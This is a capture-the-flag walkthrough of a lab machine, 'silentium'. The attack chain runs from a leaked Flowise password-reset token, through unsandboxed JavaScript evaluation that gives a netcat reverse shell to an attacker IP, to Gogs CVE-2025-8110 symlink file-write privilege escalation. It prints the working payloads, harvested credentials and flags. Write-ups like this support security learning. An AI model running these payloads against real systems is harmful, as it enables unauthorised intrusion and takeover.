## 1. Reconnaissance

Nmap scan to identify open ports and running services:

```
nmap -sV 10.129.245.103
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain?
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

## 2. Enumeration

### 2.1 VHost Fuzzing

Subdomain enumeration with gobuster:

```
gobuster vhost -u http://silentium.htb -w subdomains-top1million-5000.txt -t 20 --append-domain
```

Result:

```
staging.silentium.htb Status: 200 [Size: 3142]
```

I added this host to `/etc/hosts` and discovered a **Flowise AI** instance.

### 2.2 Version Fingerprinting

```
curl -s http://staging.silentium.htb/api/v1/version
{"version":"3.0.5"}
```

## 3. Initial Access 

Flowise 3.0.5 is vulnerable to an unauthenticated logic flaw on the "forgot password" endpoint: the reset token is leaked directly in the API response.

### 3.1 Finding a valid email

By browsing the `silentium.htb` homepage, I found three names. Testing the `firstname@silentium.htb` format, I identified `ben@silentium.htb` as a valid account.

### 3.2 Leaking the token

```
POST /api/v1/account/forgot-password HTTP/1.1
Host: staging.silentium.htb
Content-Type: application/json
x-request-from: internal

{"user":{"email":"ben@silentium.htb"}}
```

Response (201 Created):

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "tempToken": "Hm59VHbJvX8Kz0CVFaIVASEws0tsbMai3nxkM9yg46GQ0MQSB378BSF09n6EijAr",
    "tokenExpiry": "2026-09-28T12:13:04.699Z"
  }
}
```

The `tempToken` can be used directly to reset the password (note: it has a short lifespan).

### 3.3 Password reset

Using this token, I reset the admin account's password and successfully logged into the Flowise interface.

## 4. Remote Code Execution via Custom MCP (Insecure Code Evaluation)

Once authenticated, the `/api/v1/node-load-method/customMCP` endpoint turned out to be vulnerable to unsandboxed code evaluation: the `mcpServerConfig` field is evaluated as JavaScript server-side.

### 4.1 Retrieving an API Key

From the Flowise dashboard settings, I retrieved a persistent API Key (usable as `Authorization: Bearer <API_KEY>`, as an alternative to the session JWT).

### 4.2 Building the payload

By intercepting a legitimate request through the browser, I identified the exact structure expected by the endpoint: the full MCP node object, with the malicious payload nested inside `currentNode.inputs.mcpServerConfig` (a JSON string containing stringified JS).

```json
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.227 4444 >/tmp/f');return 1;})()} )"
  }
}
```

### 4.3 Execution

```
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <API_KEY>" \
  -d @payload.json
```

Response:

```
[{"label":"No Available Actions","name":"error","description":"No available actions, please check your API key and refresh"}]
```

This error message is misleading: it comes from Flowise's post-processing step, but **the JS code had already been evaluated and executed** before this error was returned. The netcat listener does receive a shell.

```
id
uid=0(root) gid=0(root) groups=0(root),...
```

This shell is root **inside the Flowise Docker container** (not on the host).

## 5. Pivoting to the Host

### 5.1 Environment variable enumeration

```
env
```

```
FLOWISE_PASSWORD=F1l3_d0ck3r
SENDER_EMAIL=ben@silentium.htb
FLOWISE_USERNAME=ben
SMTP_PASSWORD=r04D!!_R4ge
```

The `SMTP_PASSWORD` variable turns out to be the password for the system user `ben`.

### 5.2 SSH access to the host

```
ssh ben@silentium.htb
```

Successful login using the password `r04D!!_R4ge`.

## 6. User Flag

```
cat /home/ben/user.txt
a66b53e047a984c6cd1b10a59c9d2c9b
```

## 7. Privilege Escalation 

### 7.1 Service discovery

Local process enumeration:

```
ps aux | grep gogs
```

A **Gogs** service is running on port 3000, executed as **root**.

### 7.2 Exposing the service via SSH tunneling

Since the port is only accessible locally on the machine, I set up SSH port forwarding to access the Gogs web interface from the attacking machine:

```
ssh -L 8080:127.0.0.1:3000 ben@silentium.htb
```

The interface is then accessible at `http://127.0.0.1:8080`.

### 7.3 Vulnerability

CVE-2025-8110 is an arbitrary file write vulnerability in Gogs, caused by improper handling of symbolic links via the API. By pushing a repository containing a symlink pointing outside the repository, then updating that file via the Gogs API, it is possible to overwrite arbitrary files with the privileges of the user running Gogs (root).

### 7.4 Exploitation

**Step 1 — Account creation and API token**

- Register a new account on the Gogs interface
- Generate an API token via _User Settings > Applications_

**Step 2 — Creating the repo and the malicious symlink**

```
git clone http://127.0.0.1:8080/<user>/<repo>.git
cd <repo>
ln -s /etc/sudoers.d/ben malicious_link
git add malicious_link
git commit -m "Add symlink"
git push
```

**Step 3 — Triggering the arbitrary write**

A PUT request to the Gogs API updates the content of the file targeted by the symlink:

```
PUT /api/v1/repos/<user>/<repo>/contents/malicious_link
```

By writing a rule such as the following into `/etc/sudoers.d/ben`:

```
ben ALL=(ALL) NOPASSWD: ALL
```

(with a trailing newline `\n`, required for `sudo` to accept the file), I obtained full passwordless sudo access for user `ben`.

## 8. Root Flag

Back on the SSH session as `ben`:

```
sudo id
uid=0(root) gid=0(root) groups=0(root)

sudo cat /root/root.txt
7a4a0316f8faed5f786a5febcfcd0040
